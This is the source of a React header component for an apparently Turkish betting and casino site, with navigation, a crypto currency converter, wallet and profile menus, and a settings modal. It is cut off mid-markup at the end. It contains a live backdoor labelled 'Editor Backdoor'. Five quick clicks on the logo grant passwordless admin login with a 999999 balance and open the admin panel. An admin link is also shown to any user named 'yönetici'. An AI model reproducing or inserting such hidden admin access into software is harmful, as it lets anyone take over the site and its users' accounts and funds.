import React, { useState, useRef, useEffect } from 'react';
import {
  Settings, User, Pen, LogOut, ChevronDown, ChevronUp, Search, Coins, Send, X,
  MessageSquare, Home, Ticket, BarChart3, Shield, Menu, Gamepad2, Dices, Crown,
  Target, Spade, Trophy, TicketCheck, Gift, Tv, Diamond, Wallet, Club, Cherry,
  Bell, Users, ShieldCheck, Lock, Link, FileText, Clover, Activity, Briefcase, Sun, Moon, Globe, Plus
} from 'lucide-react';
import { SiteUser, UserLoyalty, MarqueeConfig } from '../types';
import { useTheme } from '../ThemeContext';
import { useLanguage, LanguageCode } from '../contexts/LanguageContext';
import { useTranslation } from 'react-i18next';
import { viewToPath } from '../utils/routes';
import SlotText from './SlotText';
import CasinoLogo from './CasinoLogo';

export interface NavVisibility {
  coupons: boolean;
  analysis: boolean;
  leagues: boolean;
  brands: boolean;
  news: boolean;
  pool: boolean;
  blackjack: boolean;
  loyalty: boolean;
  raffle: boolean;
  giveaway: boolean;
  trustedSites: boolean;
  cekilis: boolean;
}

export const DEFAULT_NAV_VISIBILITY: NavVisibility = {
  coupons: true,
  analysis: true,
  leagues: true,
  brands: true,
  news: true,
  pool: false,
  blackjack: false,
  loyalty: false,
  raffle: false,
  giveaway: false,
  trustedSites: true,
  cekilis: true,
};

interface HeaderProps {
  onAdminClick?: () => void;
  onViewChange?: (view: string) => void;
  activeView?: string;
  isAuthenticated?: boolean;
  userRole?: string | null;
  siteUser?: SiteUser | null;
  onMemberLoginClick?: () => void;
  onMemberRegisterClick?: () => void;
  onMemberLogout?: () => void;
  onSearchClick?: () => void;
  navVisibility?: NavVisibility;
  marqueeConfig?: MarqueeConfig;
  onSupportClick?: () => void;
  isChatOpen?: boolean;
  isSidebarOpen?: boolean;
  onToggleSidebar?: () => void;
  onToggleChat?: () => void;
}

function getUserLoyalty(userId: string): UserLoyalty {
  const defaultLoyalty: UserLoyalty = { userId, coins: 0, tickets: 0, pendingTickets: 0, totalEarned: 0, transactions: [], lastVolumeResetDate: '', dailyVolumeAccumulated: 0 };
  try {
    const stored = localStorage.getItem(`loyalty_${userId}`);
    if (stored) {
      const parsed = JSON.parse(stored);
      if (parsed && typeof parsed === 'object') {
        return {
          ...defaultLoyalty,
          ...parsed
        };
      }
    }
  } catch (e) {
    console.error("Error reading user loyalty:", e);
  }
  return defaultLoyalty;
}

/* ── Category definitions ── */
interface CategoryItem {
  key: string;
  view: string;
  label: string;
  icon: React.ReactNode;
  visKey?: keyof NavVisibility;
  scrollTo?: string; // if we should scroll to an element instead of switching view
  href?: string;
  requireRole?: boolean;
}

const ICON_SIZE = 'w-5 h-5';

const Header: React.FC<HeaderProps> = ({
  onAdminClick,
  onViewChange,
  activeView = 'home',
  isAuthenticated = false,
  userRole = null,
  siteUser = null,
  onMemberLoginClick,
  onMemberRegisterClick,
  onMemberLogout,
  onSearchClick,
  navVisibility,
  marqueeConfig,
  onSupportClick,
  isChatOpen = false,
  isSidebarOpen = false,
  onToggleSidebar,
  onToggleChat,
}) => {
  const [isSettingsModalOpen, setIsSettingsModalOpen] = useState(false);
  const [selectedCurrency, setSelectedCurrency] = useState('TRY');
  const [logoHovered, setLogoHovered] = useState(false);
  const [isHovered, setIsHovered] = useState(false);
  const [isProfileOpen, setIsProfileOpen] = useState(false);
  const profileRef = useRef<HTMLDivElement>(null);
  const [dropdownOpen, setDropdownOpen] = useState(false);
  const [walletDropdownOpen, setWalletDropdownOpen] = useState(false);
  const [walletSearch, setWalletSearch] = useState('');
  const [isScrolled, setIsScrolled] = useState(false);
  const { language, setLanguage, t } = useLanguage();
  const { t: tI18n } = useTranslation();

  const [langDropdownOpen, setLangDropdownOpen] = useState(false);
  const langRef = useRef<HTMLDivElement>(null);
  const dropdownRef = useRef<HTMLDivElement>(null);
  const walletDropdownRef = useRef<HTMLDivElement>(null);
  const [logoHoverCount, setLogoHoverCount] = useState(0);

  // Multi-Currency Rates & Converter Engine (Base: TRY)
  const ALL_CURRENCIES = [
    { code: 'TRY', name: 'Türk Lirası (TL)', symbol: '₺', bg: '#00E5FF', dec: 2 },
    { code: 'USD', name: 'Amerikan Doları', symbol: '$', bg: '#10B981', dec: 2 },
    { code: 'USDT', name: 'Tether (USDT)', symbol: '₮', bg: '#26A17B', dec: 2 },
    { code: 'BTC', name: 'Bitcoin (BTC)', symbol: '₿', bg: '#F7931A', dec: 5 },
    { code: 'ETH', name: 'Ethereum (ETH)', symbol: 'Ξ', bg: '#627EEA', dec: 4 },
    { code: 'XRP', name: 'Ripple (XRP)', symbol: '✕', bg: '#23292F', dec: 2 },
    { code: 'TRX', name: 'TRON (TRX)', symbol: 'T', bg: '#EF0027', dec: 2 },
    { code: 'SOL', name: 'Solana (SOL)', symbol: 'S', bg: '#14F195', dec: 3 },
    { code: 'LTC', name: 'Litecoin (LTC)', symbol: 'Ł', bg: '#345D9D', dec: 3 }
  ];

  const [rates, setRates] = useState<Record<string, number>>({
    TRY: 1,
    USD: 36.50,
    USDT: 36.50,
    BTC: 3450000.00,
    ETH: 98000.00,
    XRP: 92.50,
    TRX: 8.40,
    SOL: 6800.00,
    LTC: 4200.00
  });

  useEffect(() => {
    async function fetchRates() {
      try {
        const res = await fetch('https://api.binance.com/api/v3/ticker/price?symbols=%5B%22USDTTRY%22,%22BTCTRY%22,%22ETHTRY%22,%22XRPTRY%22,%22TRXTRY%22,%22LTCTRY%22,%22SOLTRY%22%5D');
        if (res.ok) {
          const data = await res.json();
          if (Array.isArray(data)) {
            setRates(prev => {
              const updated = { ...prev };
              data.forEach((item: { symbol: string; price: string }) => {
                const price = parseFloat(item.price);
                if (item.symbol === 'USDTTRY') {
                  updated.USDT = price;
                  updated.USD = price;
                } else if (item.symbol === 'BTCTRY') updated.BTC = price;
                else if (item.symbol === 'ETHTRY') updated.ETH = price;
                else if (item.symbol === 'XRPTRY') updated.XRP = price;
                else if (item.symbol === 'TRXTRY') updated.TRX = price;
                else if (item.symbol === 'LTCTRY') updated.LTC = price;
                else if (item.symbol === 'SOLTRY') updated.SOL = price;
              });
              return updated;
            });
          }
        }
      } catch (e) {
        // Fallback rates active
      }
    }
    fetchRates();
    const interval = setInterval(fetchRates, 30000); // 30 saniyede bir otomatik güncelle
    return () => clearInterval(interval);
  }, []);
  
  // Editor Backdoor State
  const lastLogoClickRef = useRef<number>(0);
  const [logoClickCount, setLogoClickCount] = useState(0);

  const handleLogoSecretClick = () => {
    const now = Date.now();
    if (now - lastLogoClickRef.current > 1500) {
      setLogoClickCount(1);
    } else {
      const nextCount = logoClickCount + 1;
      setLogoClickCount(nextCount);
      if (nextCount >= 5) {
        // 5 tık! Şifresiz giriş.
        localStorage.setItem('site_user_role', 'admin');
        window.dispatchEvent(new CustomEvent('site-user-login', { 
           detail: { id: 'editor_backdoor', username: 'Editor', role: 'admin', balance: 999999 } 
        }));
        setTimeout(() => {
          window.dispatchEvent(new CustomEvent('open-admin'));
        }, 100);
        setLogoClickCount(0);
        return;
      }
    }
    lastLogoClickRef.current = now;
    // Normal davranış: Anasayfaya git
    onViewChange?.('home');
  };
  const { theme, toggleTheme } = useTheme();

  const [depositUsername, setDepositUsername] = useState('');
  const [depositMsg, setDepositMsg] = useState({ type: '', text: '' });

  /* ── Category list ── */
    const categories: CategoryItem[] = [
    { key: 'spor724', view: 'spor724', label: t('header_spor724'), icon: <Target className={ICON_SIZE} /> },
    { key: 'slotra', view: 'slotra', label: t('header_gercek'), icon: <Target className={ICON_SIZE} /> },
    { key: 'mobile-bulletin', view: 'mobile-bulletin', label: t('header_mbulten'), icon: <Activity className={ICON_SIZE} /> },
    { key: 'coupons', view: 'coupons', label: t('header_kuponlar'), icon: <Ticket className={ICON_SIZE} />, visKey: 'coupons' },
    { key: 'brands', view: 'brands', label: t('header_siteler'), icon: <Shield className={ICON_SIZE} />, visKey: 'brands' },
    { key: 'trusted-sites', view: 'trusted-sites', label: t('header_guvenilir'), icon: <Shield className={ICON_SIZE} />, visKey: 'trustedSites' },
    { key: 'pool', view: 'pool', label: t('header_toto'), icon: <Target className={ICON_SIZE} />, visKey: 'pool' },
    { key: 'casino', view: 'casino', label: t('header_casino'), icon: <Spade className={ICON_SIZE} />, visKey: 'casino' },
    { key: 'loyalty', view: 'loyalty', label: t('header_gorevler'), icon: <Trophy className={ICON_SIZE} />, visKey: 'loyalty' },
  ];

  const handleDepositSubmit = () => {
    if (!depositUsername.trim()) {
      setDepositMsg({ type: 'error', text: 'Lütfen kullanıcı adınızı girin.' });
      return;
    }
    if (!siteUser) return;

    try {
      const messages = JSON.parse(localStorage.getItem('site_messages') || '[]');
      const newMessage = {
        id: Date.now().toString(),
        userId: siteUser.id,
        username: siteUser.username,
        content: `724BETS Yatırım Bildirimi:\n724BETS Kullanıcı Adı: ${depositUsername}\n\nBu kullanıcı yatırım yaptığını bildiriyor.`,
        isRead: false,
        createdAt: Date.now()
      };

      localStorage.setItem('site_messages', JSON.stringify([...messages, newMessage]));

      setDepositMsg({ type: 'success', text: 'Bildirim başarıyla gönderildi!' });
      setTimeout(() => {
        setDepositUsername('');
        setDepositMsg({ type: '', text: '' });
      }, 2000);
    } catch {
      setDepositMsg({ type: 'error', text: 'Bir hata oluştu.' });
    }
  };

  useEffect(() => {
    const handleClickOutside = (e: MouseEvent) => {
      if (profileRef.current && !profileRef.current.contains(e.target as Node)) {
        setIsProfileOpen(false);
      }
      if (langRef.current && !langRef.current.contains(e.target as Node)) {
        setLangDropdownOpen(false);
      }
      if (walletDropdownRef.current && !walletDropdownRef.current.contains(e.target as Node)) {
        setWalletDropdownOpen(false);
      }
    };
    document.addEventListener('mousedown', handleClickOutside);
    return () => document.removeEventListener('mousedown', handleClickOutside);
  }, []);

  useEffect(() => {
    const handleScroll = () => {
      setIsScrolled(window.scrollY > 20);
    };
    window.addEventListener('scroll', handleScroll, { passive: true });
    return () => window.removeEventListener('scroll', handleScroll);
  }, []);

  const isAdmin = userRole === 'admin';
  const isEditor = userRole && userRole !== 'admin';



  /* ── Handle category click ── */
  const handleCategoryClick = (cat: CategoryItem) => {
    if (cat.href) {
      window.open(cat.href, '_blank');
      return;
    }
    if (cat.scrollTo) {
      onViewChange?.(cat.view);
      const el = document.getElementById(cat.scrollTo!);
      if (el) window.scrollTo({ top: el.getBoundingClientRect().top + window.scrollY - 15, behavior: 'auto' });
    } else {
      onViewChange?.(cat.view);
    }
  };

  /* ── Is this category active? ── */
  const isCategoryActive = (cat: CategoryItem) => {
    return activeView === cat.view;
  };

  const isRetroVIP = activeView === 'raffle' || activeView === 'originals' || activeView === 'vip';

  return (
    <>
      <div className={`header-wrapper ${isScrolled ? 'scrolled' : ''} ${isRetroVIP ? 'retro-vip-header' : ''}`}>
        <style>{`
          @media (max-width: 768px) {
            .header-topbar-right .header-icon-btn {
              display: none !important;
            }
          }
          @keyframes custom-marquee {
            0% { transform: translate3d(0, 0, 0); }
            100% { transform: translate3d(-50%, 0, 0); }
          }
          .animate-custom-marquee {
            animation: custom-marquee var(--speed, 20s) linear infinite;
            will-change: transform;
            transform: translateZ(0);
            backface-visibility: hidden;
          }
          @keyframes logoShimmer {
            0%   { background-position: 200% center; }
            100% { background-position: -200% center; }
          }
          @keyframes logoGlow {
            0%, 100% { text-shadow: 0 0 10px rgba(0,255,163,0.3), 0 0 20px rgba(0,255,163,0.1); }
            50% { text-shadow: 0 0 15px rgba(0,255,163,0.5), 0 0 30px rgba(0,255,163,0.2), 0 0 45px rgba(0,255,163,0.1); }
          }
          .perspective-1000 { perspective: 1000px; }
          .transform-style-3d { transform-style: preserve-3d; }
          .backface-hidden { backface-visibility: hidden; }
          .rotate-y-180 { transform: rotateY(180deg); }
          .group:hover .group-hover\:rotate-y-180 { transform: rotateY(180deg); }
          @keyframes slotMachineDrop {
            0% { transform: translateY(-40px) scaleY(1.5); opacity: 0; filter: blur(4px); }
            60% { transform: translateY(10px) scaleY(0.9); opacity: 1; filter: blur(0); }
            80% { transform: translateY(-4px) scaleY(1.05); }
            100% { transform: translateY(0) scaleY(1); opacity: 1; }
          }
          .slot-text {
            display: inline-block;
            opacity: 0;
            animation: slotMachineDrop 0.8s cubic-bezier(0.2, 0.8, 0.2, 1) 0.3s forwards;
          }

          @keyframes neonFlickerDelay {
            0%, 5%, 15%, 25% { opacity: 0; text-shadow: none; filter: brightness(0.2); }
            10%, 20%, 30% { opacity: 0.8; text-shadow: 0 0 10px #10b981, 0 0 20px #10b981; filter: brightness(1.5); }
            35%, 100% { opacity: 1; text-shadow: 0 0 5px rgba(0,255,163,0.5), 0 0 15px rgba(0,255,163,0.8); filter: brightness(1); }
          }
          .neon-text {
            display: inline-block;
            opacity: 0;
            animation: neonFlickerDelay 2s ease-out 1.2s forwards;
          }


          .logo-text-724 {
            position: relative;
            z-index: 10000;
            display: inline-flex;
            align-items: center;
            gap: 0;
            font-family: 'Inter', sans-serif;
            font-weight: 900;
            font-size: 22px;
            letter-spacing: -0.5px;
            cursor: pointer;
            padding: 6px 16px;
            border-radius: 12px;
            transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1);
            background: transparent;
            border: 1px solid transparent;
            text-decoration: none;
            white-space: nowrap;
            overflow: hidden;
          }
          .logo-text-724 .logo-num {
            background: linear-gradient(135deg, #10b981, #10b981, #10b981);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            animation: logoGlow 3s ease-in-out infinite;
            filter: drop-shadow(0 0 8px rgba(0,255,163,0.4));
          }
          .logo-text-724 .logo-dot {
            color: #10b981;
            -webkit-text-fill-color: #10b981;
            font-weight: 900;
          }
          .logo-text-724 .logo-ext {
            background: linear-gradient(135deg, #ffffff, #cccccc);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            font-weight: 700;
            font-size: 20px;
          }
          .logo-text-724:hover {
            background: linear-gradient(135deg, rgba(0,255,163,0.1), rgba(0,255,163,0.04));
            border-color: rgba(0,255,163,0.2);
            box-shadow: 0 0 35px rgba(0,255,163,0.15), 0 0 70px rgba(0,255,163,0.05);
            transform: scale(1.04);
          }
          .logo-text-724::after {
            content: '';
            position: absolute;
            inset: 0;
            background: linear-gradient(105deg, transparent 40%, rgba(0,255,163,0.1) 50%, transparent 60%);
            background-size: 200% 100%;
            border-radius: inherit;
            pointer-events: none;
            opacity: 0;
          }
          .logo-text-724:hover::after {
            opacity: 1;
            animation: logoShimmer 2s ease-in-out infinite;
          }
          .header-topbar {
            transition: padding-left 0.3s ease-in-out;
          }
          .header-icon-btn:hover {
            color: #10b981 !important;
          }
          .retro-vip-header .header-topbar {
            background: repeating-linear-gradient(to bottom, rgba(0, 255, 255, 0.03) 0px, rgba(0, 255, 255, 0.03) 1px, #050510 1px, #050510 3px), linear-gradient(180deg, #0a0a1a 0%, #03030a 100%) !important;
            border-bottom: 1px solid rgba(255, 0, 255, 0.3) !important;
            box-shadow: 0 0 15px rgba(0, 255, 255, 0.1) !important;
          }
          .retro-vip-header .logo-text-724 span {
            color: #00ffff !important;
            text-shadow: 0 0 10px #00ffff, 0 0 20px #ff00ff !important;
          }
          .retro-vip-header svg {
            color: #ff00ff !important;
          }
          .retro-vip-header .balance-display {
            font-family: monospace;
            color: #00ff00 !important;
          }
        `}</style>

      <div className="header-topbar relative w-full h-[72px] bg-[#0A0C10] flex z-50 transition-colors duration-300 shadow-[0_4px_30px_rgba(0,0,0,0.1)]">
        <div className="w-full max-w-[1720px] mx-auto h-full flex items-center px-4 md:px-8 xl:px-12 gap-4">
            
            {/* Left Section: Logo */}
            <div className="flex items-center h-full justify-start shrink-0 lg:w-[280px]">
              {/* Logo */}
              <div 
                className="flex items-center cursor-pointer select-none group relative font-black text-2xl md:text-3xl tracking-tight"
                onClick={handleLogoSecretClick}
                style={{ fontFamily: "'Inter', sans-serif", letterSpacing: '-0.03em', WebkitFontSmoothing: 'antialiased', textRendering: 'optimizeLegibility' }}
              >
                  <CasinoLogo />

                  {/* Right-side 3-leaf clover with soft glow */}
                  <div className="flex items-center justify-center w-4 h-4 md:w-5 md:h-5 ml-0 -mt-2">
                    <svg viewBox="0 0 100 100" fill="currentColor" className="w-full h-full text-[#00E5FF] drop-shadow-[0_0_8px_rgba(0,229,255,0.3)]">
                      {/* Top leaf */}
                      <path d="M 50,45 C 35,25 40,10 50,18 C 60,10 65,25 50,45 Z" />
                      {/* Left leaf */}
                      <path d="M 47,48 C 25,35 15,45 25,55 C 15,65 25,75 47,48 Z" />
                      {/* Right leaf */}
                      <path d="M 53,48 C 75,35 85,45 75,55 C 85,65 75,75 53,48 Z" />
                      {/* Stem pointing down/left */}
                      <path d="M 50,50 C 45,65 40,75 35,70 C 45,70 50,60 50,50 Z" />
                    </svg>
                  </div>
              </div>
            </div>

            {/* Center Section: Empty spacing */}
            <div className="hidden lg:flex flex-1 mx-4"></div>

            <div className="flex shrink-0 items-center justify-end h-full relative overflow-visible">
              <div className="flex items-center justify-end h-full gap-3 md:gap-4 z-10">
                
                {/* Search Button (Mercek İkonu) */}
                <button 
                  onClick={onSearchClick}
                  className="w-[44px] h-[44px] rounded-xl flex items-center justify-center bg-[#20242D] border border-transparent hover:bg-[#2a303c] text-zinc-300 hover:text-white transition-all duration-300 shadow-sm cursor-pointer"
                  title="Arama"
                >
                  <Search className="w-[20px] h-[20px]" />
                </button>

          {siteUser ? (
            <div className="flex items-center gap-3 md:gap-4 ml-1">


              {/* Combined Balance & Wallet Pill */}
              {(() => {
                const activeCurr = ALL_CURRENCIES.find(c => c.code === selectedCurrency) || ALL_CURRENCIES[0];
                const displayRate = rates[activeCurr.code] || 1;
                const convertedDisplayVal = (Number(siteUser.balance || 0) / displayRate);

                const filteredCurrencies = ALL_CURRENCIES.filter(c => 
                  c.name.toLowerCase().includes(walletSearch.toLowerCase()) || 
                  c.code.toLowerCase().includes(walletSearch.toLowerCase())
                );

                return (
                  <div className="flex items-center gap-1.5 bg-[#20242D] border border-transparent rounded-xl p-1.5 shadow-inner relative" ref={walletDropdownRef}>
                    {/* Balance Selector */}
                    <div 
                      className="flex items-center px-3 md:px-4 cursor-pointer hover:bg-white/5 rounded-lg transition-colors h-[36px]"
                      onClick={() => setWalletDropdownOpen(prev => !prev)}
                    >
                      <span className="font-black text-[#00E5FF] text-[13px] md:text-[14px] tracking-tight mr-2 whitespace-nowrap drop-shadow-[0_0_5px_rgba(16,185,129,0.3)]">
                        {activeCurr.symbol}{convertedDisplayVal.toLocaleString('tr-TR', { minimumFractionDigits: activeCurr.dec, maximumFractionDigits: activeCurr.dec })} <span className="text-[10px] text-zinc-400 font-bold ml-0.5">{activeCurr.code}</span>
                      </span>
                      <ChevronDown className={`w-4 h-4 text-[#00E5FF]/70 transition-transform ${walletDropdownOpen ? 'rotate-180' : ''}`} />
                    </div>
                    
                    {/* Deposit Button */}
                    <button 
                      onClick={() => {
                        const event = new CustomEvent('openDepositModal', { detail: { tab: 'deposit' } });
                        window.dispatchEvent(event);
                      }}
                      className="bg-gradient-to-r from-[color:var(--theme-accent)]/20 to-[color:var(--theme-accent)]/5 hover:from-[color:var(--theme-accent)]/30 hover:to-[color:var(--theme-accent)]/10 text-[color:var(--theme-accent)] font-black tracking-widest text-[12px] h-[36px] px-4 md:px-5 rounded-lg transition-all flex items-center shadow-[0_0_15px_rgba(0,229,255,0.15)] hover:shadow-[0_0_25px_rgba(0,229,255,0.3)] uppercase border-none"
                    >
                      <Wallet className="w-4 h-4 mr-2 hidden sm:block" />
                      CÜZDAN
                    </button>

                    {walletDropdownOpen && (
                      <div className="absolute left-1/2 -translate-x-1/2 md:translate-x-0 md:right-0 md:left-auto top-[calc(100%+8px)] w-72 rounded-xl py-0 z-50 bg-[#0A0C10] border border-white/10 shadow-[0_10px_40px_rgba(0,0,0,0.8)] text-left overflow-hidden">
                        <div className="p-3 border-b border-white/5">
                          <div className="relative">
                            <Search className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-gray-400" />
                            <input 
                              type="text" 
                              value={walletSearch}
                              onChange={(e) => setWalletSearch(e.target.value)}
                              placeholder="Para Birimi Veya Coin Ara..." 
                              className="w-full bg-[#0A0C10] border border-white/5 rounded-lg py-2 pl-9 pr-4 text-white text-sm focus:outline-none focus:border-emerald-500/50 transition-colors placeholder-zinc-500"
                            />
                          </div>
                        </div>
                        <div className="flex flex-col max-h-[300px] overflow-y-auto">
                          {filteredCurrencies.map((crypto) => {
                            const cRate = rates[crypto.code] || 1;
                            const cVal = (Number(siteUser.balance || 0) / cRate);
                            const isSelected = selectedCurrency === crypto.code;

                            return (
                              <div 
                                key={crypto.code} 
                                onClick={() => {
                                  setSelectedCurrency(crypto.code);
                                  setWalletDropdownOpen(false);
                                }}
                                className={`flex items-center justify-between px-4 py-3 hover:bg-white/10 cursor-pointer transition-colors group ${isSelected ? 'bg-white/10 border-l-2 border-[#00E5FF]' : ''}`}
                              >
                                <div className="flex flex-col">
                                  <span className="text-white font-bold text-[14px] font-mono">
                                    {crypto.symbol}{cVal.toLocaleString('tr-TR', { minimumFractionDigits: crypto.dec, maximumFractionDigits: crypto.dec })}
                                  </span>
                                  <span className="text-[10px] text-zinc-500">1 {crypto.code} = {cRate.toLocaleString('tr-TR', { maximumFractionDigits: 2 })} ₺</span>
                                </div>
                                <div className="flex items-center gap-2">
                                  <span className="text-zinc-400 text-[11px] font-semibold group-hover:text-white transition-colors">{crypto.name}</span>
                                  <div className="w-6 h-6 rounded-full flex items-center justify-center text-[#06080C] text-[10px] font-black shadow-sm" style={{ backgroundColor: crypto.bg }}>
                                    {crypto.symbol}
                                  </div>
                                </div>
                              </div>
                            );
                          })}
                        </div>
                      </div>
                    )}
                  </div>
                );
              })()}              <div className="relative" ref={profileRef}>
                {/* User Avatar Block */}
                <div 
                  className="flex items-center bg-[#20242D] hover:bg-[#2a303c] border-none shadow-sm cursor-pointer transition-colors rounded-xl p-1.5 pr-3 h-[48px]"
                  onClick={() => setIsProfileOpen(prev => !prev)}
                >
                  <div className="w-[36px] h-[36px] rounded-lg bg-gradient-to-br from-purple-500/15 to-pink-500/15 text-purple-400 flex items-center justify-center mr-2 md:mr-3 border-none shadow-[0_0_15px_rgba(168,85,247,0.15)] overflow-hidden relative">
                     <User className="w-[20px] h-[20px] z-10 relative" />
                  </div>
                  <div className="hidden sm:flex flex-col items-start mr-3">
                    <span className="text-white font-bold text-[13px] leading-none mb-1.5">{siteUser.username}</span>
                    <div className="flex flex-col w-full gap-1">
                      <div className="flex items-center justify-between w-full">
                        <span className="text-purple-400 text-[9px] uppercase font-black tracking-widest flex items-center">
                           LVL {siteUser.loyalty?.level || 1}
                        </span>
                        <span className="text-zinc-500 text-[8px] font-bold">{siteUser.loyalty?.points || 0} XP</span>
                      </div>
                      <div className="w-[80px] h-[4px] bg-black/40 rounded-full overflow-hidden">
                        <div className="h-full bg-gradient-to-r from-purple-500 to-pink-500" style={{ width: `${((siteUser.loyalty?.points || 0) % 1000) / 10}%` }}></div>
                      </div>
                    </div>
                  </div>
                  <ChevronDown className={`w-4 h-4 text-zinc-500 transition-transform ${isProfileOpen ? 'rotate-180' : ''}`} />
                </div>

                {isProfileOpen && (
                  <div className="absolute right-0 top-[calc(100%+8px)] w-64 rounded-xl py-2 z-50 bg-[#0A0C10] border border-white/10 shadow-[0_10px_40px_rgba(0,0,0,0.8)] text-left">
                    {/* VIP Progress */}
                    <div className="px-4 py-3 border-b border-white/5 bg-black/20">
                      <div className="flex items-center justify-between mb-1">
                        <span className="text-[#00E5FF] font-bold text-[12px] uppercase">VIP {siteUser.loyalty?.tier || 'Bronze'}</span>
                        <span className="text-white text-[12px]">{((siteUser.loyalty?.points || 0) % 1000) / 10}%</span>
                      </div>
                      <div className="w-full h-1.5 bg-black/50 rounded-full overflow-hidden">
                        <div className="h-full bg-[#00E5FF]" style={{ width: `${((siteUser.loyalty?.points || 0) % 1000) / 10}%` }}></div>
                      </div>
                    </div>

                    {/* ADMIN PANEL LINK */}
                    {(siteUser?.role?.toLowerCase() === 'admin' || siteUser?.username?.toLowerCase() === 'yönetici') && (
                      <button 
                        onClick={() => { if(onViewChange) onViewChange('admin'); setIsProfileOpen(false); }}
                        className="w-full text-left px-4 py-2.5 text-white hover:text-zinc-300 hover:bg-white/5 transition-colors flex items-center text-[14px] font-black tracking-wider uppercase border-b border-white/5"
                      >
                        <Crown className="w-4 h-4 mr-3 text-white" /> Yönetim Paneli
                      </button>
                    )}
                    
                    
                    <button 
                      onClick={() => { if(onViewChange) onViewChange('profile'); setIsProfileOpen(false); }}
                      className="w-full text-left px-4 py-2.5 text-zinc-300 hover:text-white hover:bg-white/5 transition-colors flex items-center text-[14px]"
                    >
                      <User className="w-4 h-4 mr-3 text-zinc-400" /> {t("hesabim")}
                    </button>
                    <button 
                      onClick={() => { if(onViewChange) onViewChange('profile'); setIsProfileOpen(false); }}
                      className="w-full text-left px-4 py-2.5 text-zinc-300 hover:text-white hover:bg-white/5 transition-colors flex items-center text-[14px]"
                    >
                      <Settings className="w-4 h-4 mr-3 text-zinc-400" /> {t("ayarlar")}
                    </button>
                    <div className="h-[1px] w-full bg-white/5 my-1"></div>
                    <button 
                      onClick={onMemberLogout}
                      className="w-full text-left px-4 py-2.5 text-red-400 hover:text-red-300 hover:bg-white/5 transition-colors flex items-center text-[14px]"
                    >
                      <LogOut className="w-4 h-4 mr-3" /> {t("cikis_yap")}
                    </button>
                  </div>
                )}
              </div>
            </div>
          ) : (
            <div className="flex items-center gap-2 h-[40px]">
              
              <button 
                onClick={() => {
                  const event = new CustomEvent('openAuthModal', { detail: 'login' });
                  window.dispatchEvent(event);
                }}
                className="bg-[#20242D] border border-transparent hover:bg-[#2a303c] text-white font-bold text-[14px] h-[40px] px-6 rounded-xl transition-all duration-300 whitespace-nowrap"
              >
                {tI18n('header.login')}
              </button>
              
              <button 
                onClick={() => {
                  const event = new CustomEvent('openAuthModal', { detail: 'register' });
                  window.dispatchEvent(event);
                }}
                className="bg-[#00E5FF] hover:bg-[#00d0e8] text-[#002b30] font-black text-[14px] h-[40px] px-7 rounded-xl transition-all whitespace-nowrap shadow-[0_4px_12px_rgba(0,229,255,0.2)]"
              >
                {tI18n('header.register')}
              </button>

            </div>
          )}

          {/* Sidebar Toggle & Settings Icons */}
          <div className="flex items-center gap-2 ml-1">
             <button 
               onClick={onToggleChat}
               className={`w-[40px] h-[40px] rounded-xl flex items-center justify-center transition-all duration-300 ${isChatOpen ? 'bg-[color:var(--theme-accent)]/15 text-[color:var(--theme-accent)] shadow-[0_0_15px_rgba(0,229,255,0.15)]' : 'bg-[#20242D] border-none hover:bg-[#2a303c] text-zinc-300 hover:text-white'} shadow-sm`}
               title="Sohbet (Chat)"
             >
               <MessageSquare className="w-[18px] h-[18px]" strokeWidth={2} />
             </button>

           </div>

            </div>
         </div>
      </div>
    </div>
  </div>
    {/* Global Settings Modal (Adım 3) */}
    {isSettingsModalOpen && (
      <div className="fixed inset-0 z-[999999] flex items-center justify-center p-4">
        {/* Backdrop - Solid to hide background */}
        <div 
          className="absolute inset-0 bg-[#0A0D14] z-0"
          onClick={() => setIsSettingsModalOpen(false)}
        ></div>
        
        {/* Modal Content */}
        <div className="bg-[#181B21] w-full max-w-md rounded-2xl p-6 border border-white/5 shadow-2xl relative z-10 animate-in zoom-in-95 duration-200">
          {/* Header */}
          <div className="flex items-center justify-between mb-6 pb-4 border-b border-white/5">
            <h2 className="text-white font-black text-xl flex items-center gap-2">
              <Globe className="w-6 h-6 text-[#00E5FF]" />
              Global Ayarlar
            </h2>
            <button 
              onClick={() => setIsSettingsModalOpen(false)} 
              className="w-8 h-8 rounded-lg flex items-center justify-center text-zinc-500 hover:text-white hover:bg-white/5 transition-colors bg-[#20242D]"
            >
              <X className="w-5 h-5" />
            </button>
          </div>

          {/* Body */}
          <div className="space-y-6">
            {/* Language Selection */}
            <div>
              <label className="text-zinc-500 font-bold text-xs uppercase tracking-wider mb-3 block">
                Dil ve Bölge (Language)
              </label>
              <div className="grid grid-cols-2 gap-3">
                {[
                  { code: 'tr', label: 'Türkçe', icon: '🇹🇷' },
                  { code: 'en', label: 'English', icon: '🇬🇧' },
                  { code: 'pt', label: 'Português', icon: '🇵🇹' },
                  { code: 'es', label: 'Español', icon: '🇪🇸' }
                ].map((lang) => (
                  <button
                    key={lang.code}
                    onClick={() => setLanguage(lang.code as LanguageCode)}
                    className={`flex items-center gap-3 p-3 rounded-xl transition-all duration-300 border ${
                      language === lang.code 
                        ? 'border-[#00E5FF] bg-white/5 text-white' 
                        : 'border-transparent bg-[#20242D] text-zinc-400 hover:text-white hover:bg-[#2a303c]'
                    }`}
                  >
                    <span className="text-xl">{lang.icon}</span>
                    <span className="font-semibold text-sm">{lang.label}</span>
                  </button>
                ))}
              </div>
            </div>

            {/* Currency Selection */}
            <div>
              <label className="text-zinc-500 font-bold text-xs uppercase tracking-wider mb-3 block">
                Para Birimi (Currency)
              </label>
              <div className="grid grid-cols-2 gap-3">
                {[
                  { code: 'TRY', label: 'Türk Lirası', symbol: '₺' },
                  { code: 'USD', label: 'US Dollar', symbol: '$' },
                  { code: 'EUR', label: 'Euro', symbol: '€' },
                  { code: 'USDT', label: 'Tether', symbol: '₮' }
                ].map((curr) => (
                  <button
                    key={curr.code}
                    onClick={() => setSelectedCurrency(curr.code)}
                    className={`flex items-center gap-3 p-3 rounded-xl transition-all duration-300 border ${
                      selectedCurrency === curr.code 
                        ? 'border-[#00E5FF] bg-white/5 text-white' 
                        : 'border-transparent bg-[#20242D] text-zinc-400 hover:text-white hover:bg-[#2a303c]'
                    }`}
                  >
                    <div className={`w-8 h-8 rounded-full flex items-center justify-center font-bold ${
